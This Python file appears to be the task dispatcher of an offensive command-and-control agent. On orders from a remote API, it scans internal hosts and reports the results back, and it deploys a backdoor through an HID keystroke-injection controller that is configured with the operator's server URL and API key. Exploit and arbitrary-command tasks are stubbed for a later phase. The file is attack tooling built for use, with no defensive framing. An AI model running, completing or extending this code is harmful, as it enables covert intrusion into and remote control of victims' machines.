import json
import asyncio
import scanner
import hid_controller
import poller


async def dispatch(task, api_client, cfg):
    task_id = task.get("task_id", "")
    task_type = task.get("task_type", "")
    target_ip = task.get("target_ip", "")

    print(f"[task_runner] Dispatching {task_type} (id={task_id})")

    try:
        if task_type == "scan_private":
            result = scanner.scan_host(target_ip, timeout=cfg["scan_timeout"])
            api_client.push_scan(result)
            poller.add_result(task_id, "completed", result=f"Scanned {target_ip}")

        elif task_type == "deploy_backdoor":
            payload = {}
            raw = task.get("payload", "")
            if raw:
                try:
                    payload = json.loads(raw)
                except Exception:
                    pass
            os_type = payload.get("os", "windows")
            success = hid_controller.deploy(os_type, cfg["server_url"], cfg["api_key"])
            if success:
                poller.add_result(task_id, "completed", result=f"HID deploy ({os_type}) done")
            else:
                poller.add_result(task_id, "failed", error_message="HID deploy failed")

        elif task_type in ("exploit", "command"):
            poller.add_result(task_id, "failed", error_message="not implemented (Phase 6+)")

        else:
            poller.add_result(task_id, "failed", error_message=f"unknown task_type: {task_type}")

    except Exception as e:
        print(f"[task_runner] Exception in {task_type}: {e}")
        poller.add_result(task_id, "failed", error_message=str(e))
